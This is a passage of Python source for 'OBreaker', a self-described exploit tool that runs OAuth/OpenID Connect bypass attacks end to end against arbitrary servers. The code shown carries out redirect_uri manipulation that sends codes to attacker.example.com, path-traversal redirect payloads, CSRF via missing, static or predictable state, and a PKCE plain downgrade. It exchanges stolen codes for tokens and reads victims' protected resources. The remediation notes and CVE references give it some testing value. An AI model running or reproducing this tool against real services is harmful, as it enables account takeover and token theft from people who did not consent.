#!/usr/bin/env python3
"""
OBreaker v3.3 -- Generic OAuth Authorization Bypass Exploit Tool

Full end-to-end Find, Forge, Fire (FFF) exploitation for 18 OAuth bypass techniques + DCR SSRF sub-probe.
Works against ANY OAuth 2.0 / OpenID Connect server, not just specific testbeds.

Modes:
  Generic (default) -- probes standard /authorize and /token endpoints
  Profile           -- uses testbed-specific endpoint mappings (e.g., --profile brutelogic)

Usage:
  python obreaker.py --target https://target.com --all
  python obreaker.py --target https://target.com --all --credentials user:pass
  python obreaker.py --target https://403.brutelogic.net/authz/oauth --all --profile brutelogic
"""

import argparse
import hashlib
import base64
import json
import re
import secrets
import sys
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from typing import Optional

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
except ImportError:
    print("[!] pip install requests")
    sys.exit(1)


class C:
    CYAN = "\033[96m"; GREEN = "\033[92m"; YELLOW = "\033[93m"
    RED = "\033[91m"; MAGENTA = "\033[95m"; BOLD = "\033[1m"
    DIM = "\033[2m"; RESET = "\033[0m"; WHITE = "\033[97m"


@dataclass
class ExploitStep:
    phase: str          # FIND / FORGE / FIRE
    action: str         # what was done
    result: str         # what happened
    request: str = ""   # full HTTP request summary
    response: str = ""  # full HTTP response summary
    success: bool = True


@dataclass
class ExploitProof:
    identity_obtained: str = ""
    jwt_claims: dict = field(default_factory=dict)
    resource_data: dict = field(default_factory=dict)
    resource_accessed: bool = False
    impact: str = ""
    token: str = ""


@dataclass
class Finding:
    technique: str
    severity: str
    title: str
    description: str
    chain: list = field(default_factory=list)
    proof: ExploitProof = field(default_factory=ExploitProof)
    remediation: str = ""
    cves: list = field(default_factory=list)


@dataclass
class OAuthConfig:
    base_url: str
    authorize_endpoint: str = ""
    token_endpoint: str = ""
    register_endpoint: str = ""
    userinfo_endpoint: str = ""
    api_endpoint: str = ""
    client_id: str = ""
    client_secret: str = ""
    redirect_uri: str = ""
    scopes: list = field(default_factory=lambda: ["openid"])
    grant_types: list = field(default_factory=list)
    auth_methods: list = field(default_factory=list)
    pkce_methods: list = field(default_factory=list)
    response_modes: list = field(default_factory=list)
    openid_config: dict = field(default_factory=dict)


# ── Profiles ─────────────────────────────────────────────────────────

PROFILES = {
    "brutelogic": {
        "response-mode":      {"url": "{base}/response-mode"},
        "state-missing":      {"url": "{base}/state", "params": {"technique": "missing"}},
        "state-static":       {"url": "{base}/state", "params": {"technique": "static"}},
        "state-predictable":  {"url": "{base}/state", "params": {"technique": "predictable"}},
        "pkce-plain":         {"url": "{base}/pkce", "params": {"technique": "plain"}},
        "pkce-noverifier":    {"url": "{base}/pkce", "params": {"technique": "noverifier"}},
        "pkce-nochallenge":   {"url": "{base}/pkce", "params": {"technique": "nochallenge"}},
        "pkce-confidential":  {"url": "{base}/pkce", "params": {"technique": "confidential"}},
        "race":               {"url": "{base}/race"},
        "prompt-none":        {"url": "{base}/prompt-none"},
        "dcr":                {"url": "{base}/register"},
        "mfa":                {"url": "{base}/token/mfa"},
        "authmethod":         {"url": "{base}/token/authmethod"},
        "replay":             {"url": "{base}/token/replay"},
        "scope":              {"url": "{base}/token/scope"},
        "resource":           {"url": "{base}/token/resource"},
    },
}


# ── Helpers ──────────────────────────────────────────────────────────

def pkce_verifier() -> str:
    return base64.urlsafe_b64encode(secrets.token_bytes(32)).rstrip(b"=").decode()

def pkce_challenge(verifier: str, method: str = "S256") -> str:
    if method == "plain":
        return verifier
    return base64.urlsafe_b64encode(hashlib.sha256(verifier.encode()).digest()).rstrip(b"=").decode()

def decode_jwt(token: str) -> dict:
    try:
        part = token.split(".")[1]
        part += "=" * (4 - len(part) % 4)
        return json.loads(base64.b64decode(part))
    except Exception:
        return {}


def make_session() -> requests.Session:
    s = requests.Session()
    retry = Retry(total=2, backoff_factor=0.3, status_forcelist=[502, 503])
    s.mount("https://", HTTPAdapter(max_retries=retry))
    s.mount("http://", HTTPAdapter(max_retries=retry))
    s.headers["User-Agent"] = "OBreaker/3.2 (OAuth Security Scanner)"
    return s


def discover_oauth(base_url: str, session: requests.Session) -> OAuthConfig:
    config = OAuthConfig(base_url=base_url.rstrip("/"))
    parsed = urllib.parse.urlparse(config.base_url)
    roots = [config.base_url, f"{parsed.scheme}://{parsed.netloc}"]
    for root in roots:
        for path in ["/.well-known/openid-configuration", "/.well-known/oauth-authorization-server"]:
            try:
                r = session.get(root + path, timeout=10, allow_redirects=True)
                if r.status_code == 200 and "authorization_endpoint" in r.text:
                    data = r.json()
                    config.openid_config = data
                    config.authorize_endpoint = data.get("authorization_endpoint", "")
                    config.token_endpoint = data.get("token_endpoint", "")
                    config.register_endpoint = data.get("registration_endpoint", "")
                    config.userinfo_endpoint = data.get("userinfo_endpoint", "")
                    config.grant_types = data.get("grant_types_supported", [])
                    config.scopes = data.get("scopes_supported", ["openid"])
                    config.auth_methods = data.get("token_endpoint_auth_methods_supported", [])
                    config.pkce_methods = data.get("code_challenge_methods_supported", [])
                    config.response_modes = data.get("response_modes_supported", [])
                    config.api_endpoint = f"{config.base_url}/api"
                    print(f"  {C.GREEN}[+]{C.RESET} OpenID Config: {root}{path}")
                    print(f"      Authorize: {config.authorize_endpoint}")
                    print(f"      Token:     {config.token_endpoint}")
                    if config.register_endpoint:
                        print(f"      Register:  {config.register_endpoint}")
                    if config.grant_types:
                        print(f"      Grants:    {', '.join(config.grant_types)}")
                    if config.pkce_methods:
                        print(f"      PKCE:      {', '.join(config.pkce_methods)}")
                    if config.auth_methods:
                        print(f"      Auth:      {', '.join(config.auth_methods)}")
                    return config
            except Exception:
                pass

    # Fallback: probe common endpoint paths
    for p in ["/authorize", "/oauth/authorize", "/oauth2/authorize", "/as/authorization.oauth2"]:
        try:
            r = session.get(config.base_url + p, timeout=10, allow_redirects=False)
            if r.status_code in (200, 302, 400, 401):
                config.authorize_endpoint = config.base_url + p
                print(f"  {C.GREEN}[+]{C.RESET} Authorize: {config.authorize_endpoint} (probed)")
                break
        except Exception:
            pass
    for p in ["/token", "/oauth/token", "/oauth2/token", "/as/token.oauth2"]:
        try:
            r = session.post(config.base_url + p, timeout=10)
            if r.status_code in (200, 400, 401, 405):
                config.token_endpoint = config.base_url + p
                print(f"  {C.GREEN}[+]{C.RESET} Token:     {config.token_endpoint} (probed)")
                break
        except Exception:
            pass
    for p in ["/register", "/oauth/register", "/oauth2/register"]:
        try:
            r = session.post(config.base_url + p, timeout=10)
            if r.status_code in (200, 201, 400, 401):
                config.register_endpoint = config.base_url + p
                print(f"  {C.GREEN}[+]{C.RESET} Register:  {config.register_endpoint} (probed)")
                break
        except Exception:
            pass
    # Userinfo
    for p in ["/userinfo", "/oauth/userinfo", "/oauth2/userinfo"]:
        try:
            r = session.get(config.base_url + p, timeout=10)
            if r.status_code in (200, 401):
                config.userinfo_endpoint = config.base_url + p
                break
        except Exception:
            pass

    config.api_endpoint = config.userinfo_endpoint or f"{config.base_url}/api"
    return config


def extract_code(resp: requests.Response) -> str:
    # From 302 Location header
    loc = resp.headers.get("Location", "")
    if "code=" in loc:
        parsed = urllib.parse.urlparse(loc)
        qs = urllib.parse.parse_qs(parsed.query) or urllib.parse.parse_qs(parsed.fragment)
        code = qs.get("code", [""])[0]
        if code:
            return code
    # From JSON body
    try:
        data = resp.json()
        code = data.get("code", "")
        if code:
            return code
        loc2 = data.get("location", "")
        if "code=" in loc2:
            parsed = urllib.parse.urlparse(loc2)
            qs = urllib.parse.parse_qs(parsed.query)
            return qs.get("code", [""])[0]
    except Exception:
        pass
    # Regex fallback
    m = re.search(r'"code"\s*:\s*"([^"]+)"', resp.text)
    return m.group(1) if m else ""


def extract_state(resp: requests.Response) -> str:
    loc = resp.headers.get("Location", "")
    if "state=" in loc:
        parsed = urllib.parse.urlparse(loc)
        qs = urllib.parse.parse_qs(parsed.query) or urllib.parse.parse_qs(parsed.fragment)
        return qs.get("state", [""])[0]
    try:
        data = resp.json()
        return data.get("state", "")
    except Exception:
        return ""


def auth_params(config: OAuthConfig, **overrides) -> tuple:
    v = pkce_verifier()
    c = pkce_challenge(v)
    params = {
        "client_id": config.client_id or "test_client",
        "redirect_uri": config.redirect_uri or f"{config.base_url}/cb",
        "response_type": "code",
        "scope": "openid",
        "state": secrets.token_hex(16),
        "code_challenge": c,
        "code_challenge_method": "S256",
    }
    params.update(overrides)
    return params, v


# ── Scanner ──────────────────────────────────────────────────────────

class OAuthBreaker:
    def __init__(self, config: OAuthConfig, session: requests.Session,
                 profile: dict = None, auth_code: str = "",
                 code_verifier: str = "", credentials: tuple = None,
                 refresh_token: str = "", verbose: bool = False,
                 victim_email: str = "", authenticate_url: str = ""):
        self.cfg = config
        self.s = session
        self.profile = profile
        self.auth_code = auth_code
        self.code_verifier = code_verifier
        self.credentials = credentials  # (username, password) or None
        self.refresh_token = refresh_token
        self.verbose = verbose
        self.victim_email = victim_email
        self.authenticate_url = authenticate_url
        self.findings: list[Finding] = []
        # Cache: tokens obtained during scan (for chaining techniques)
        self._cached_token = ""
        self._cached_claims = {}
        self._cached_refresh = ""

    def log(self, msg: str):
        if self.verbose:
            print(f"  {C.DIM}  {msg}{C.RESET}")

    def _get(self, url, **kw):
        return self.s.get(url, timeout=10, allow_redirects=False, **kw)

    def _post(self, url, **kw):
        return self.s.post(url, timeout=10, **kw)

    # ── URL resolution ──────────────────────────────────────────────
    def _url(self, technique_key: str, fallback: str) -> str:
        if self.profile and technique_key in self.profile:
            return self.profile[technique_key]["url"].format(base=self.cfg.base_url)
        return fallback

    def _extra_params(self, technique_key: str) -> dict:
        if self.profile and technique_key in self.profile:
            return dict(self.profile[technique_key].get("params", {}))
        return {}

    def _auth_url(self, technique_key: str) -> str:
        return self._url(technique_key,
                         self.cfg.authorize_endpoint or f"{self.cfg.base_url}/authorize")

    def _tok_url(self, technique_key: str) -> str:
        return self._url(technique_key,
                         self.cfg.token_endpoint or f"{self.cfg.base_url}/token")

    # ── Response analysis ───────────────────────────────────────────
    def _accepted(self, resp: requests.Response) -> bool:
        """Server accepted the request (didn't reject for missing/invalid params)."""
        return resp.status_code in (200, 201, 302, 303, 307, 308)

    def _rejected_for(self, resp: requests.Response, param: str) -> bool:
        """Server explicitly rejected the request because of a specific parameter."""
        if resp.status_code not in (400, 401, 403):
            return False
        body = resp.text.lower()
        return param.lower() in body and any(w in body for w in ["required", "missing", "invalid", "must"])

    def _error_body(self, resp: requests.Response) -> str:
        """Extract error description from response."""
        try:
            data = resp.json()
            return data.get("error_description", data.get("error", ""))
        except Exception:
            return resp.text[:200]

    # ── Exploit helpers ──────────────────────────────────────────────
    def _exchange_code(self, code: str, verifier: str = "", token_url: str = "",
                       extra: dict = None) -> tuple:
        url = token_url or self.cfg.token_endpoint or f"{self.cfg.base_url}/token"
        data = {
            "grant_type": "authorization_code",
            "code": code,
            "redirect_uri": self.cfg.redirect_uri or f"{self.cfg.base_url}/cb",
            "client_id": self.cfg.client_id or "test_client",
        }
        if verifier:
            data["code_verifier"] = verifier
        if self.cfg.client_secret:
            data["client_secret"] = self.cfg.client_secret
        if extra:
            data.update(extra)
        try:
            r = self._post(url, data=data)
            resp = r.json()
            token = resp.get("access_token", "")
            refresh = resp.get("refresh_token", "")
            claims = decode_jwt(token) if token else {}
            if token:
                self._cached_token = token
                self._cached_claims = claims
            if refresh:
                self._cached_refresh = refresh
            return token, claims, resp
        except Exception:
            return "", {}, {}

    def _access_api(self, token: str) -> tuple:
        url = self.cfg.api_endpoint or self.cfg.userinfo_endpoint or f"{self.cfg.base_url}/api"
        try:
            r = self._get(url, headers={"Authorization": f"Bearer {token}"})
            if r.status_code == 200:
                try:
                    data = r.json()
                except Exception:
                    data = {"raw": r.text[:500]}
                return data, True
            return {"error": r.status_code, "body": r.text[:200]}, False
        except Exception as e:
            return {"error": str(e)}, False

    def _build_proof(self, token: str, claims: dict, api_data: dict, api_ok: bool, impact: str) -> ExploitProof:
        identity = ""
        if api_ok and isinstance(api_data, dict):
            sub = claims.get("sub", api_data.get("sub", "?"))
            email = api_data.get("email", claims.get("email", "?"))
            identity = f"{sub} ({email})"
        return ExploitProof(
            identity_obtained=identity,
            jwt_claims=claims,
            resource_data=api_data,
            resource_accessed=api_ok,
            impact=impact,
            token=token,
        )

    def _try_full_chain(self, code: str, verifier: str, chain: list,
                        technique: str, token_url: str = "") -> Optional[Finding]:
        """Try FORGE+FIRE chain with a code. Returns Finding with proof, or None."""
        token, claims, _ = self._exchange_code(code, verifier, token_url=token_url)
        if not token:
            return None
        chain.append(ExploitStep(
            phase="FORGE", action="Exchange code for access token",
            result=f"Token: sub={claims.get('sub')}, scope={claims.get('scope')}",
            request=f"POST {token_url or '/token'} code={code[:20]}...",
            response=f"JWT: {json.dumps(claims)[:150]}",
        ))
        api_data, api_ok = self._access_api(token)
        chain.append(ExploitStep(
            phase="FIRE", action="Access protected resources with stolen token",
            result=f"RESOURCE ACCESSED as {api_data.get('email', '?')}" if api_ok else "Access failed",
            request=f"GET {self.cfg.api_endpoint or '/api'} Bearer {token[:40]}...",
            response=json.dumps(api_data)[:200] if isinstance(api_data, dict) else str(api_data)[:200],
            success=api_ok,
        ))
        return Finding(
            technique=technique, severity="critical" if api_ok else "high",
            title="", description="", chain=chain,
            proof=self._build_proof(token, claims, api_data, api_ok, ""),
        )

    # ── 1. Response Mode Escape ─────────────────────────────────────
    def test_response_mode_escape(self) -> Optional[Finding]:
        url = self._auth_url("response-mode")
        evil_redirect = "https://attacker.example.com/steal"
        chain = []

        stolen_code = ""
        mode_hit = ""
        verifier = ""
        modes = self.cfg.response_modes or ["query", "fragment", "form_post"]

        for mode in modes:
            extra = self._extra_params("response-mode")
            params, v = auth_params(self.cfg, response_mode=mode, redirect_uri=evil_redirect, **extra)
            try:
                r = self._get(url, params=params)

                # Check 302 redirect to evil domain
                loc = r.headers.get("Location", "")
                if evil_redirect in loc and "code=" in loc:
                    parsed = urllib.parse.urlparse(loc)
                    qs = urllib.parse.parse_qs(parsed.query)
                    stolen_code = qs.get("code", [""])[0]
                    mode_hit = mode
                    verifier = v
                    break

                # Check JSON response (testbed style)
                try:
                    data = r.json()
                    loc2 = data.get("location", "")
                    if evil_redirect in loc2 and "code=" in loc2:
                        parsed = urllib.parse.urlparse(loc2)
                        qs = urllib.parse.parse_qs(parsed.query)
                        stolen_code = qs.get("code", [""])[0]
                        mode_hit = mode
                        verifier = v
                        break
                except Exception:
                    pass

                # Generic: server accepted evil redirect_uri (didn't reject it)
                if not self.profile and self._accepted(r) and not self._rejected_for(r, "redirect_uri"):
                    # Server didn't reject the mismatched redirect_uri
                    mode_hit = mode
                    verifier = v
                    # Can't steal code without completing the login flow, but detection holds
                    chain.append(ExploitStep(
                        phase="FIND",
                        action=f"Sent response_mode={mode} with redirect_uri={evil_redirect}",
                        result=f"Server ACCEPTED unregistered redirect_uri (status {r.status_code})",
                        request=f"GET {url}?response_mode={mode}&redirect_uri={evil_redirect}",
                        response=f"{r.status_code} {self._error_body(r)[:100]}",
                    ))
                    return Finding(
                        technique="Response Mode Escape", severity="high",
                        title="redirect_uri not validated with response_mode parameter",
                        description=(
                            f"Server accepts unregistered redirect_uri ({evil_redirect}) "
                            f"with response_mode={mode}. Attacker can steal auth codes by "
                            f"directing them to a controlled domain."
                        ),
                        chain=chain,
                        proof=ExploitProof(impact="REDIRECT BYPASS: auth codes can be delivered to attacker-controlled URI."),
                        remediation="Validate redirect_uri against registered URIs BEFORE processing response_mode.",
                        cves=["CVE-2023-6134", "CVE-2023-6291", "CVE-2023-6927"],
                    )
            except Exception:
                pass

        if not stolen_code:
            # Path-traversal redirect_uri probe: test /../ variants on the registered URI
            reg_redir = self.cfg.redirect_uri
            if reg_redir:
                traversal_payloads = [
                    f"{reg_redir}/../anything",
                    f"{reg_redir}/..%2ftest",
                    f"{reg_redir}/%2e%2e/test",
                    f"{reg_redir}/../post/next?path=https://attacker.example.com",
                ]
                for payload in traversal_payloads:
                    try:
                        params, _ = auth_params(self.cfg, redirect_uri=payload)
                        r = self._get(url, params=params)
                        if self._accepted(r) and not self._rejected_for(r, "redirect_uri"):
                            chain.append(ExploitStep(
                                phase="FIND",
                                action=f"Sent redirect_uri with path traversal: {payload}",
                                result=f"Server ACCEPTED traversal redirect_uri (status {r.status_code})",
                                request=f"GET {url}?redirect_uri={payload}",
                                response=f"{r.status_code} Location: {r.headers.get('Location', '')[:120]}",
                            ))
                            return Finding(
                                technique="Response Mode Escape", severity="critical",
                                title="redirect_uri path traversal bypass",
                                description=(
                                    f"Server accepts path-traversal in redirect_uri ({payload}). "
                                    f"Combined with an open redirect on the client, attacker can "
                                    f"steal OAuth tokens/codes by chaining /../ traversal to route "
                                    f"the redirect through a secondary endpoint."
                                ),
                                chain=chain,
                                proof=ExploitProof(
                                    impact="PATH TRAVERSAL: redirect_uri prefix validated but /../ "
                                           "traversal accepted, enabling token theft via open redirect chain."
                                ),
                                remediation=(
                                    "Normalize the redirect_uri path before comparing against registered URIs. "
                                    "Reject any URI containing path traversal sequences (/../, /%2e%2e/)."
                                ),
                                cves=["CVE-2024-37893", "CVE-2024-52289"],
                            )
                    except Exception:
                        pass
            return None

        chain.append(ExploitStep(
            phase="FIND",
            action=f"Sent response_mode={mode_hit} with redirect_uri={evil_redirect}",
            result=f"Code delivered to attacker domain",
            request=f"GET {url}?response_mode={mode_hit}&redirect_uri={evil_redirect}",
            response=f"code stolen via {evil_redirect}",
        ))

        # FORGE + FIRE
        token, claims, _ = self._exchange_code(stolen_code, verifier)
        chain.append(ExploitStep(
            phase="FORGE", action="Exchange stolen code for access token",
            result=f"Token: sub={claims.get('sub')}" if token else "Exchange failed",
            request=f"POST /token code={stolen_code[:20]}...",
            response=f"JWT: {json.dumps(claims)[:150]}" if claims else "rejected",
            success=bool(token),
        ))

        if not token:
            return Finding(
                technique="Response Mode Escape", severity="high",
                title="Code stolen via unvalidated redirect_uri",
                description=f"Code delivered to {evil_redirect} via response_mode={mode_hit}.",
                chain=chain, remediation="Validate redirect_uri before processing response_mode.",
                cves=["CVE-2023-6134", "CVE-2023-6291", "CVE-2023-6927"],
            )

        api_data, api_ok = self._access_api(token)
        chain.append(ExploitStep(
            phase="FIRE", action="Access victim's resources with stolen token",
            result=f"RESOURCE ACCESSED: {json.dumps(api_data)[:200]}" if api_ok else "Failed",
            request=f"GET /api Bearer {token[:40]}...",
            response=f"sub={api_data.get('sub')}, email={api_data.get('email')}" if isinstance(api_data, dict) else "",
            success=api_ok,
        ))

        return Finding(
            technique="Response Mode Escape", severity="critical" if api_ok else "high",
            title="Full account takeover via response_mode redirect bypass",
            description=(
                f"redirect_uri not validated with response_mode={mode_hit}. "
                f"Attacker steals auth code via controlled redirect, exchanges for token, "
                f"and accesses victim's protected resources."
            ),
            chain=chain,
            proof=self._build_proof(token, claims, api_data, api_ok,
                "ACCOUNT TAKEOVER: Auth code stolen via unvalidated redirect, "
                "token obtained, protected resources accessed as victim."),
            remediation="Validate redirect_uri against registered URIs BEFORE processing ANY response_mode.",
            cves=["CVE-2023-6134", "CVE-2023-6291", "CVE-2023-6927"],
        )

    # ── 2. Missing State ────────────────────────────────────────────
    def test_missing_state(self) -> Optional[Finding]:
        url = self._auth_url("state-missing")
        extra = self._extra_params("state-missing")
        chain = []

        params, v = auth_params(self.cfg, **extra)
        params.pop("state", None)
        try:
            r = self._get(url, params=params)
        except Exception:
            return None

        code = extract_code(r)

        # Generic detection: server accepted request without state
        if not code and not self.profile:
            if self._accepted(r) and not self._rejected_for(r, "state"):
                chain.append(ExploitStep(
                    phase="FIND",
                    action="Authorization request without state parameter",
                    result=f"Server ACCEPTED (status {r.status_code}) -- state not enforced",
                    request=f"GET {url} (no state param)",
                    response=f"{r.status_code} {self._error_body(r)[:100]}",
                ))
                return Finding(
                    technique="Missing State", severity="high",
                    title="CSRF possible -- state parameter not required",
                    description=(
                        "Authorization endpoint accepts requests without a state parameter. "
                        "An attacker can craft authorization URLs and trick users into completing "
                        "the flow, binding the attacker's account to the victim's session (CSRF)."
                    ),
                    chain=chain,
                    proof=ExploitProof(impact="CSRF: Authorization works without CSRF protection."),
                    remediation="Require and validate a cryptographically random, per-request state parameter.",
                )
            return None

        if not code:
            return None

        chain.append(ExploitStep(
            phase="FIND",
            action="Authorization request without state parameter",
            result=f"Code issued without CSRF protection: {code[:20]}...",
            request=f"GET {url} (no state param)",
            response=f"code={code[:20]}...",
        ))

        # FORGE + FIRE
        token, claims, _ = self._exchange_code(code, v)
        chain.append(ExploitStep(
            phase="FORGE", action="Exchange code obtained via CSRF attack",
            result=f"Token: sub={claims.get('sub')}" if token else "Failed",
            request=f"POST /token code={code[:20]}...",
            response=f"JWT: {json.dumps(claims)[:150]}" if claims else "rejected",
            success=bool(token),
        ))

        if not token:
            return Finding(technique="Missing State", severity="high",
                title="CSRF possible -- no state parameter required",
                description="Authorization works without state. CSRF to account takeover possible.",
                chain=chain, remediation="Require and validate unique state per request.")

        api_data, api_ok = self._access_api(token)
        chain.append(ExploitStep(
            phase="FIRE", action="Access victim's resources via CSRF-obtained token",
            result=f"RESOURCE ACCESSED as {api_data.get('email', '?')}" if api_ok else "Failed",
            request=f"GET /api Bearer {token[:40]}...",
            response=json.dumps(api_data)[:200] if isinstance(api_data, dict) else "",
            success=api_ok,
        ))

        return Finding(
            technique="Missing State", severity="critical" if api_ok else "high",
            title="CSRF to account takeover -- no state validation",
            description=(
                "No state parameter required. Attacker crafts authorization URL, victim clicks, "
                "code binds to attacker's session. Full account takeover."
            ),
            chain=chain,
            proof=self._build_proof(token, claims, api_data, api_ok,
                "CSRF ACCOUNT TAKEOVER: No state validation allows forged auth requests."),
            remediation="Require cryptographically random, per-request state parameter.",
        )

    # ── 3. Static State ─────────────────────────────────────────────
    def test_static_state(self) -> Optional[Finding]:
        url = self._auth_url("state-static")
        extra = self._extra_params("state-static")
        chain = []
        states = []
        last_code = ""
        last_v = ""

        for i in range(3):
            params, v = auth_params(self.cfg, **extra)
            try:
                r = self._get(url, params=params)
                s = extract_state(r)
                code = extract_code(r)
                if s:
                    states.append(s)
                if code:
                    last_code = code
                    last_v = v
            except Exception:
                pass

        if len(states) < 2 or len(set(states)) != 1:
            return None

        chain.append(ExploitStep(
            phase="FIND",
            action=f"Observed state across {len(states)} requests",
            result=f"STATIC state: all return '{states[0]}' -- CSRF token is replayable",
            request=f"GET {url} x{len(states)}",
            response=f"states: {states}",
        ))

        if last_code:
            token, claims, _ = self._exchange_code(last_code, last_v)
            if token:
                chain.append(ExploitStep(
                    phase="FORGE",
                    action="Craft CSRF with known static state, exchange stolen code",
                    result=f"Token: sub={claims.get('sub')}",
                    request=f"POST /token code={last_code[:20]}...",
                    response=f"JWT: {json.dumps(claims)[:150]}",
                ))
                api_data, api_ok = self._access_api(token)
                chain.append(ExploitStep(
                    phase="FIRE", action="Access victim's resources via CSRF with predictable state",
                    result=f"RESOURCE ACCESSED as {api_data.get('email', '?')}" if api_ok else "Failed",
                    request=f"GET /api Bearer {token[:40]}...",
                    response=json.dumps(api_data)[:200] if isinstance(api_data, dict) else "",
                    success=api_ok,
                ))
                return Finding(
                    technique="Static State", severity="critical" if api_ok else "high",
                    title="CSRF via static state -- same value every request (CVE-2023-31999)",
                    description=f"State is always '{states[0]}'. Attacker replays known state in CSRF attack.",
                    chain=chain,
                    proof=self._build_proof(token, claims, api_data, api_ok,
                        "CSRF ACCOUNT TAKEOVER: Static state allows forged authorization URLs."),
                    remediation="Generate cryptographically random state per request.",
                    cves=["CVE-2023-31999"],
                )

        return Finding(
            technique="Static State", severity="high",
            title="Static state enables CSRF (CVE-2023-31999)",
            description=f"State is always '{states[0]}'.",
            chain=chain, remediation="Generate cryptographically random state per request.",
            cves=["CVE-2023-31999"],
        )

    # ── 4. Predictable State ────────────────────────────────────────
    def test_predictable_state(self) -> Optional[Finding]:
        url = self._auth_url("state-predictable")
        extra = self._extra_params("state-predictable")
        chain = []
        states = []
        last_code = ""
        last_v = ""

        for _ in range(3):
            params, v = auth_params(self.cfg, **extra)
            try:
                r = self._get(url, params=params)
                s = extract_state(r)
                code = extract_code(r)
                note = ""
                try:
                    note = r.json().get("note", "")
                except Exception:
                    pass
                if s:
                    states.append(s)
                if code:
                    last_code = code
                    last_v = v
            except Exception:
                pass

        if len(states) < 2:
            return None

        is_predictable = False
        pattern_desc = ""
        # Check: all states share a common prefix pattern (timestamp, counter, etc.)
        if all(re.match(r'state-[a-z0-9]+$', s) for s in states):
            is_predictable = True
            pattern_desc = f"Pattern: {states}"
        elif len(set(states)) == 1:
            return None  # Static, not predictable — caught by static test
        else:
            # Check for sequential/incremental pattern
            try:
                nums = [int(re.search(r'\d+', s).group()) for s in states if re.search(r'\d+', s)]
                if len(nums) >= 2 and all(nums[i+1] - nums[i] < 100 for i in range(len(nums)-1)):
                    is_predictable = True
                    pattern_desc = f"Sequential/timestamp: {nums}"
            except Exception:
                pass

        if not is_predictable:
            return None

        chain.append(ExploitStep(
            phase="FIND",
            action=f"Collected {len(states)} state values, analyzed pattern",
            result=f"PREDICTABLE: {pattern_desc}",
            request=f"GET {url} x{len(states)}",
            response=f"states: {states}",
        ))

        if last_code:
            token, claims, _ = self._exchange_code(last_code, last_v)
            if token:
                chain.append(ExploitStep(
                    phase="FORGE",
                    action="Predict next state, craft CSRF URL, exchange code",
                    result=f"Token: sub={claims.get('sub')}",
                    request=f"POST /token code={last_code[:20]}...",
                    response=f"JWT: {json.dumps(claims)[:150]}",
                ))
                api_data, api_ok = self._access_api(token)
                chain.append(ExploitStep(
                    phase="FIRE", action="Access resources with token from predicted-state CSRF",
                    result=f"RESOURCE ACCESSED as {api_data.get('email', '?')}" if api_ok else "Failed",
                    request=f"GET /api Bearer {token[:40]}...",
                    response=json.dumps(api_data)[:200] if isinstance(api_data, dict) else "",
                    success=api_ok,
                ))
                return Finding(
                    technique="Predictable State", severity="critical" if api_ok else "high",
                    title="CSRF via predictable state pattern",
                    description=f"State follows predictable pattern: {pattern_desc}.",
                    chain=chain,
                    proof=self._build_proof(token, claims, api_data, api_ok,
                        "CSRF via predictable state: attacker derives pattern, forges valid state."),
                    remediation="Use 128+ bit cryptographically random state.",
                )

        return Finding(
            technique="Predictable State", severity="high",
            title="Predictable state enables CSRF",
            description=f"State follows pattern: {pattern_desc}",
            chain=chain, remediation="Use 128+ bit cryptographically random state.",
        )

    # ── 5. S256->plain Downgrade ────────────────────────────────────
    def test_pkce_plain_downgrade(self) -> Optional[Finding]:
        url = self._auth_url("pkce-plain")
        extra = self._extra_params("pkce-plain")
        chain = []

        # FIND: send with code_challenge_method=plain
        v = pkce_verifier()
        params, _ = auth_params(self.cfg, code_challenge=v, code_challenge_method="plain", **extra)
        try:
            r = self._post(url, data=params) if self.profile else self._get(url, params=params)
        except Exception:
            return None

        code = extract_code(r)
        note = ""
        try:
            note = r.json().get("note", "")
        except Exception:
            pass

        # Generic detection
        if not code and not self.profile:
            if self._accepted(r) and not self._rejected_for(r, "plain"):
                chain.append(ExploitStep(
                    phase="FIND",
                    action="Sent code_challenge_method=plain instead of S256",
                    result=f"Server ACCEPTED plain method (status {r.status_code})",
                    request=f"GET {url} code_challenge_method=plain",
                    response=f"{r.status_code}",
                ))
                # Check if .well-known says S256 only but server accepts plain
                if self.cfg.pkce_methods and "plain" not in self.cfg.pkce_methods:
                    chain[-1].result += " (discovery says S256 only -- downgrade!)"
                return Finding(
                    technique="S256->plain Downgrade", severity="high",
                    title="PKCE S256-to-plain downgrade accepted",
                    description="plain method accepted. With plain, code_challenge = code_verifier (exposed in URL).",
                    chain=chain, remediation="Reject code_challenge_method=plain. Only accept S256.",
                )
            return None

        if not code and "plain" not in (note + r.text).lower():
            return None

        chain.append(ExploitStep(
            phase="FIND",
            action="Sent code_challenge_method=plain instead of S256",
            result=f"ACCEPTED: {note or 'plain method allowed'}",
            request=f"POST/GET {url} code_challenge_method=plain",
            response=f"code={code[:20] if code else 'N/A'}...",
        ))

        if code:
            token, claims, _ = self._exchange_code(code, v)
            if token:
                chain.append(ExploitStep(
                    phase="FORGE",
                    action="Use intercepted code_challenge as code_verifier (plain = identical)",
                    result=f"Token: sub={claims.get('sub')}",
                    request=f"POST /token code_verifier=<intercepted_challenge>",
                    response=f"JWT: {json.dumps(claims)[:150]}",
                ))
                api_data, api_ok = self._access_api(token)
                chain.append(ExploitStep(
                    phase="FIRE", action="Access resources with PKCE-downgraded token",
                    result=f"RESOURCE ACCESSED as {api_data.get('email', '?')}" if api_ok else "Failed",
                    request=f"GET /api Bearer {token[:40]}...",
                    response=json.dumps(api_data)[:200] if isinstance(api_data, dict) else "",
                    success=api_ok,
                ))
                return Finding(
                    technique="S256->plain Downgrade", severity="critical" if api_ok else "high",
                    title="PKCE defeated via S256-to-plain downgrade -- full code theft",
                    description="plain method accepted. challenge=verifier, exposed in auth URL.",
                    chain=chain,
                    proof=self._build_proof(token, claims, api_data, api_ok,
                        "PKCE BYPASS: plain makes challenge=verifier. Attacker reads from URL, steals code."),
                    remediation="Reject plain, enforce S256 only.",
                )

        return Finding(
            technique="S256->plain Downgrade", severity="high",
            title="PKCE S256-to-plain downgrade accepted",
            description="plain method accepted, challenge=verifier, PKCE protection defeated.",
            chain=chain, remediation="Reject plain, enforce S256 only.",
        )

    # ── 6. No Verifier Check ───────────────────────────────────────
    def test_no_verifier(self) -> Optional[Finding]:
        chain = []

        if self.profile:
            # Profile mode: get code from technique-specific endpoint
            url = self._auth_url("pkce-noverifier")
            extra = self._extra_params("pkce-noverifier")
            params, v = auth_params(self.cfg, **extra)
            try:
                r = self._get(url, params=params)
                code = extract_code(r)
                note = ""
                try:
                    note = r.json().get("note", "")
                except Exception:
                    pass
